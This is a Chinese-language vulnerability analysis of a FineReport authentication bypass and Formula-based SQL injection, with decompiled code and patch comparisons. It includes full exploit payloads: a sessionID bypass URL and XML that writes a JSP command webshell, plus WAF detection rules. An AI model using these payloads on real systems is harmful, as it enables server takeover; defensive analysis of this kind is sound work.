# FineReport export/excel SQL注入与Webshell落地漏洞详细分析报告

## 漏洞概述

FineReport（帆软报表）存在一处高危漏洞，源于 `export/excel` 接口对传入参数缺乏严格校验。攻击者可构造恶意请求绕过鉴权，并通过 Formula 表达式注入执行任意 SQL 语句，最终实现 Webshell 落地和远程代码执行。

## 漏洞影响范围

受影响的产品版本：
- FineReport < 11.5.4.1
- FineBi 7.0.* < 7.0.5
- FineBi 6.1.* < 6.1.8
- FineBi 6.0.* < 6.0.24
- FineDataLink 5.0.* < 5.0.4.3
- FineDataLink 4.0.* < 4.2.11.3

## 漏洞分析

### 一、鉴权绕过漏洞分析

#### 1.1 拦截器链概述

帆软的请求在到达实际业务代码前，会经过多个 Interceptor 的校验。核心拦截器链如下：

```
SystemAvailableInterceptor → MigrationInterceptor → EncryptionInterceptor
→ DecisionInterceptor → SecurityAccessInterceptor → SessionCheckInterceptor
```

其中 `DecisionInterceptor` 实现了对模板的鉴权操作。

#### 1.2 鉴权检查流程

在 `DecisionInterceptor` 中，请求会经过多个 `RequestChecker` 的校验。其中 `ReportTemplateRequestChecker` 负责检查报表模板相关的请求权限。

**源码位置**: `com/fr/decision/webservice/interceptor/handler/ReportTemplateRequestChecker.java`

##### 条件1: acceptRequest - 请求包含指定参数

```java
@Override
public boolean acceptRequest(HttpServletRequest httpServletRequest, HandlerMethod handlerMethod) {
    TemplateAuth templateAuth = (TemplateAuth) handlerMethod.getMethod().getAnnotation(TemplateAuth.class);
    return templateAuth != null && templateAuth.product() == TemplateProductType.FINE_REPORT
           && StringUtils.isNotEmpty(getTemplateId(httpServletRequest, handlerMethod));
}
```

`getTemplateId` 方法会检查请求是否包含以下参数之一：`viewlet`、`reportlet`、`formlet`、`reportlets`。

**源码位置**: `com/fr/util/TemplateParser.java:25-39`

```java
public static String analyzeTemplateID(HttpServletRequest httpServletRequest) {
    String hTTPRequestParameter = NetworkHelper.getHTTPRequestParameter(httpServletRequest, "viewlet");
    if (hTTPRequestParameter == null) {
        hTTPRequestParameter = NetworkHelper.getHTTPRequestParameter(httpServletRequest, "reportlet");
    }
    if (hTTPRequestParameter == null) {
        hTTPRequestParameter = NetworkHelper.getHTTPRequestParameter(httpServletRequest, "formlet");
    }
    if (hTTPRequestParameter == null) {
        hTTPRequestParameter = NetworkHelper.getHTTPRequestParameter(httpServletRequest, "reportlets");
    }
    if (hTTPRequestParameter == null) {
        hTTPRequestParameter = NetworkHelper.getHTTPRequestParameter(httpServletRequest, ParameterConstants.VIEWLETS);
    }
    return hTTPRequestParameter;
}
```

#### 1.3 鉴权绕过核心缺陷

**关键漏洞点**: `checkTemplateAuthority` 方法

##### 修复前代码逻辑（漏洞版本）:

```java
private boolean checkTemplateAuthority(String var1, String[] var2, int var3) throws Exception {
    AuthorityValue var4 = this.getTemplateAuthorityValue(var1);
    if (var4 == AuthorityValue.REJECT) {
        return false;
    } else if (var4 == AuthorityValue.ACCEPT) {
        return true;
    } else {
        if (var3 >= 1) {
            return this.checkTemplateAuthority("reportlets", var2, var3 - 1);
        } else {
            return false;  // 关键漏洞点：当 var3 == 0 时返回 false
        }
    }
}
```

##### 修复后代码逻辑（当前版本）:

**源码位置**: `com/fr/decision/webservice/interceptor/handler/ReportTemplateRequestChecker.java:184-199`

```java
private boolean checkTemplateAuthority(String str, String[] strArr, int i) throws Exception {
    AuthorityValue templateAuthorityValue = getTemplateAuthorityValue(str);
    if (templateAuthorityValue != null) {
        if (templateAuthorityValue != AuthorityValue.ACCEPT
            && templateAuthorityValue == AuthorityValue.REJECT) {
            return false;
        }
        return true;
    }
    if (i > 1) {
        return checkTemplateAuthority(getParentPath(strArr, i - 1), strArr, i - 1);
    }
    if (i == 1) {
        return checkTemplateAuthority("reportlets", strArr, i - 1);
    }
    return true;  // 关键修复：当 i == 0 时返回 true，而不是 false
}
```

#### 1.4 漏洞成因分析

| 对比项 | 修复前 | 修复后 |
|--------|--------|--------|
| `var3/i == 0` 时返回值 | `false` | `true` |
| 空路径模板鉴权结果 | 绕过鉴权 | 需要鉴权 |

**漏洞利用原理**:

当传入模板路径为 `/` 时，经过 `split("/")` 分割后，数组长度为 0，即 `var3 == 0`。

- **修复前**: 返回 `false`，表示模板不需要鉴权
- **修复后**: 返回 `true`，表示模板需要鉴权

#### 1.5 绕过 payload 构造

满足鉴权绕过需要同时满足以下条件：

1. 请求参数包含 `viewlet`、`reportlet`、`formlet`、`reportlets` 之一
2. 参数内容为 `/` 或 `[{'reportlet':'/'}]`（JSON数组格式）
3. 包含参数 `op=getSessionID`
4. 使用 `GroupReportletCreator`，需要请求参数为 `viewlets` 或 `reportlets`，且参数内容以 `[` 开头、`]` 结尾

**最终 payload**:
```
/webroot/decision/view/report?op=getSessionID&reportlets=[{'reportlet':'/'}]
```

### 二、getSessionID 流程分析

#### 2.1 GroupReportletCreator 的特殊处理

**源码位置**: `com/fr/web/reportlet/GroupReportletCreator.java:45-57`

```java
@Override
public Weblet createWebletByRequest(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse) {
    TemplatePathNode templatePathNodeQueryPath = queryPath(httpServletRequest);
    String path = templatePathNodeQueryPath.getPath();
    boolean z = !"false".equals(WebUtils.getHTTPRequestParameter(httpServletRequest, ParameterConstants.__CUMULATE_PAGE_NUMBER__));
    Actor actorCreateActor = createActor(httpServletRequest);
    if (oldWebletOrServletCheck(httpServletRequest, templatePathNodeQueryPath)) {
        if ("getSessionID".equals(WebUtils.getHTTPRequestParameter(httpServletRequest, "op"))) {
            return OldWeblet.asOldReportlets(path).bindRealReportlet(new GroupTemplateReportlet(path, actorCreateActor, WebUtils.parameters4SessionIDInfor(httpServletRequest), z));
        }
        return OldWeblet.asOldReportlets(path);
    }
    return new GroupTemplateReportlet(path, actorCreateActor, WebUtils.parameters4SessionIDInfor(httpServletRequest), z);
}
```

`GroupReportletCreator` 重写了 `createWebletByRequest` 方法，当请求参数包含 `op=getSessionID` 时，可以返回非空值，从而成功生成 sessionId。

### 三、Formula 表达式注入漏洞分析

#### 3.1 漏洞入口

**源码位置**: `com/fr/nx/app/web/v9/handler/handler/largeds/LargeDatasetExcelExportHandler.java:111-137`

```java
private void dealParam(DirectExcelExportModel directExcelExportModel, Calculator calculator,
        LargeDatasetExcelExportJavaScript largeDatasetExcelExportJavaScript,
        HttpServletRequest httpServletRequest, TemplateSessionIDInfo templateSessionIDInfo,
        Map<String, Object> map) throws UtilEvalError {

    Map<String, Object> paramsMap = getParamsMap(WebUtils.getHTTPRequestParameter(httpServletRequest, ExportJavaScript.FUNCTION_PARAMS));
    ParameterProvider[] parameters = largeDatasetExcelExportJavaScript.getParameters();
    addNameSpace(httpServletRequest, calculator, SessionIDInfo.asNameSpace(templateSessionIDInfo.getSessionID()), ParameterMapNameSpace.create(parameters));
    Parameter[] parameterArrProviders2Parameter = Parameter.providers2Parameter(parameters);
    LinkedHashMap linkedHashMap = new LinkedHashMap(16);

    for (Parameter parameter : parameterArrProviders2Parameter) {
        Object obj = map.get(parameter.getName());
        if (obj != null) {
            linkedHashMap.put(parameter.getName(), obj);
        } else {
            JSONObject jSONObject = (JSONObject) paramsMap.get(parameter.getName());
            if (jSONObject != null) {
                String strValueOf = String.valueOf(parameter.getValue());
                for (Map.Entry<String, Object> entry : jSONObject.toMap().entrySet()) {
                    strValueOf = strValueOf.replaceAll(WIDGET_PREFIX + entry.getKey(), "\"" + entry.getValue().toString() + "\"");
                }
                linkedHashMap.put(parameter.getName(), calculator.evalValue(strValueOf));
            } else if (parameter.getValue() instanceof Formula) {
                // 关键漏洞点：当参数值为 Formula 类型时，直接调用 evalValue 执行表达式
                linkedHashMap.put(parameter.getName(), calculator.evalValue(String.valueOf(parameter.getValue())));
            } else {
                linkedHashMap.put(parameter.getName(), parameter.getValue());
            }
        }
    }
    directExcelExportModel.setParameters(dealWithAuthParam(linkedHashMap, templateSessionIDInfo));
}
```

#### 3.2 XML 参数解析

攻击者可以通过 `params` 参数传入 XML 格式的数据，其中可以包含 `Formula` 类型的参数。

**源码位置**: `com/fr/base/BaseFormula.java:187-203`

```java
@Override
public void readXML(XMLableReader xMLableReader) {
    if (xMLableReader.isChildNode()) {
        String tagName = xMLableReader.getTagName();
        if (!"Attributes".equals(tagName)) {
            if (XMLConstants.OBJECT_TAG.equals(tagName)) {
                setResult(GeneralXMLTools.readObject(xMLableReader));
            }
        } else {
            setReserveInResult(xMLableReader.getAttrAsBoolean("reserveExecute", false));
            setReserveOnWriteOrAnaly(xMLableReader.getAttrAsBoolean("reserveInWeb", true));
            String elementValue = xMLableReader.getElementValue();
            if (elementValue != null) {
                setContent(elementValue);  // 设置 Formula 表达式内容
            }
        }
    }
}
```

#### 3.3 恶意 payload 构造

```xml
<R>
    <LargeDatasetExcelExportJS exportFileName="test" dsName="ds1" colNames="{}" exportFormat="excel" encodeFormat="UTF-8"/>
    <Parameters>
        <Parameter>
            <Attributes name="p1"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo', DECODE('%77%61%69%62%69%77%61%69%62%69'), 1, 1)</Attributes>
            </Object>
        </Parameter>
    </Parameters>
</R>
```

### 四、SQL 注入与 Webshell 落地

#### 4.1 帆软 SQL 安全检查机制

**源码位置**: `com/fr/cbb/dialect/security/JDBCSecurityChecker.java:70-81`

```java
private static String removeSpecialCharacters(String originalQuery) {
    if (StringUtils.isEmpty(originalQuery)) {
        return originalQuery;
    }
    String query = ignoreQuotesAndNotes(originalQuery.toLowerCase());
    StringBuilder result = new StringBuilder();
    for (int i = 0; i < query.length(); i++) {
        char nextChar = isSpecialCharacter(query.charAt(i)) ? ' ' : query.charAt(i);
        result.append(nextChar);
    }
    return result.toString();
}

private static boolean isSpecialCharacter(char c) {
    return c == ',' || c == '\n' || c == ';' || c == '\t' || c == '\r' || c == '\f' || c == 11 || c == 65279;
}
```

#### 4.2 安全检查关键字

**源码位置**: `com/fr/cbb/dialect/security/InsecurityElementFactory.java:33`

```java
FORBIDDEN_ELEMENTS_OF_VALIDATION_QUERY = new InsecurityElement[]{
    new InsecuritySQLKeyword("insert"),
    new InsecuritySQLKeyword("merge"),
    new InsecuritySQLKeyword("attach"),
    new InsecuritySQLKeyword("xp_dirtree"),
    new InsecuritySQLKeyword("VACUUM")  // 新增：修复后添加
};
```

#### 4.3 修复前后安全检查对比

| 安全检查项 | 修复前 | 修复后 |
|-----------|--------|--------|
| `\ufeff` 字符过滤 | 无 | 已添加 (char 65279) |
| `VACUUM` 关键字检测 | 无 | 已添加 |
| `PRAGMA` 关键字检测 | 无 | 已添加 |
| `REPLACE` 关键字检测 | 无 | 已添加 |
| `DETACH` 关键字检测 | 无 | 已添加 |

**SQLite 安全检查源码位置**: `com/fr/cbb/dialect/security/element/porvider/impl/SQLiteInsecurityElementProvider.java`

```java
@Override
protected void init() {
    register(InsecurityElementType.SQL_FUNCTION, "load_extension");
}
```

#### 4.4 Webshell 落地利用链

攻击者可利用以下 SQL 语句实现 Webshell 落地：

1. 备份原数据库
2. 删除数据库内容
3. 创建表并写入 Webshell 代码
4. 使用 `VACUUM INTO` 导出为 JSP 文件

**payload 示例**:
```xml
<R>
    <Parameters a="1">
        <Parameter>
            <Attributes name="p0"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo',DECODE('VACUUM+INTO+%27.%2Ffrdemo.db.bak%27%3B'),1,1)</Attributes>
            </Object>
        </Parameter>
        <Parameter>
            <Attributes name="p1"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo',DECODE('PRAGMA+writable_schema%3D1%3B'),1,1)-sql('FRDemo',"delete from sqlite_schema",1,1)</Attributes>
            </Object>
        </Parameter>
        <Parameter>
            <Attributes name="p2"></Attributes>
            <Object t="Formula">
                <Attributes>sql('FRDemo',DECODE('CREATE+TABLE+t1+%28p+text%29%3B'),1,1)-sql('FRDemo',DECODE('REPLACE+INTO+t1+VALUES+%28%27%3C%25+Runtime.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29%3B+%25%3E%27%29%3B'),1,1)-sql('FRDemo',"COMMIT",1)-sql('FRDemo',DECODE('VACUUM+INTO+%27..%2Fwebapps%2Fwebroot%2Fshell.jsp%27%3B'),1,1)</Attributes>
            </Object>
        </Parameter>
    </Parameters>
    <LargeDatasetExcelExportJS exportFileName="test" dsName="ds1" colNames="{}" exportFormat="excel" encodeFormat="UTF-8"/>
</R>
```

### 五、完整攻击流程

```
┌─────────────────────────────────────────────────────────────────┐
│  Step 1: 获取 sessionId (鉴权绕过)                                │
│  GET /webroot/decision/view/report?op=getSessionID&reportlets=[{'reportlet':'/'}]
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 2: 发送恶意 payload (Formula 表达式注入)                    │
│  POST /webroot/decision/nx/report/v9/largedataset/export/excel  │
│  Header: sessionID: <获取的sessionId>                            │
│  Body: params=<恶意XML>&__parameters__={}&functionParams={}      │
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 3: 执行任意 SQL (SQLite 数据库操作)                         │
│  - 创建表写入 Webshell 内容                                       │
│  - VACUUM INTO 导出为 JSP 文件                                   │
└─────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 4: 访问 Webshell 获取服务器权限                             │
│  GET /webroot/shell.jsp?cmd=whoami                               │
└─────────────────────────────────────────────────────────────────┘
```

### 六、修复建议

#### 6.1 官方修复方案

升级至以下安全版本：
- FineReport >= 11.5.4.1
- FineBi 7.0.* >= 7.0.5
- FineBi 6.1.* >= 6.1.8
- FineBi 6.0.* >= 6.0.24
- FineDataLink 5.0.* >= 5.0.4.3
- FineDataLink 4.0.* >= 4.2.11.3

#### 6.2 临时缓解措施

1. **网络层面**: 限制 `/webroot/decision/view/report` 和 `/webroot/decision/nx/report/v9/largedataset/export/excel` 接口的访问

2. **WAF 规则**: 添加以下检测规则
   - 检测 `reportlets=[{` 或 `viewlets=[{` 格式的请求
   - 检测请求参数中包含 `<Object t="Formula">` 的 XML 内容
   - 检测 `VACUUM`、`PRAGMA`、`DECODE` 等敏感关键字

3. **数据库层面**: 如果使用 SQLite，考虑迁移到其他数据库类型

### 七、漏洞总结

| 漏洞类型 | 严重程度 | CVSS 评分 |
|---------|---------|----------|
| 鉴权绕过 | 高 | 7.5 |
| Formula 表达式注入 | 高 | 9.8 |
| SQL 注入 | 高 | 9.8 |
| 远程代码执行 | 严重 | 10.0 |

**漏洞利用条件**:
1. 目标系统使用 SQLite 数据库（用于 Webshell 落地）
2. 存在可访问的 FRRDemo 数据库连接
3. 未升级至安全版本

**修复核心点**:
1. 修复 `checkTemplateAuthority` 方法的边界条件判断
2. 增强 SQL 安全检查机制，添加对 `VACUUM`、`PRAGMA`、`REPLACE` 等关键字的检测
3. 添加对 `\ufeff` 等特殊字符的过滤

---

**参考来源**:
- 漏洞分析原文：帆软报表 exportexcel SQL注入与Webshell落地利用分析
- 源码版本：FineReport 11.0 (修复后版本)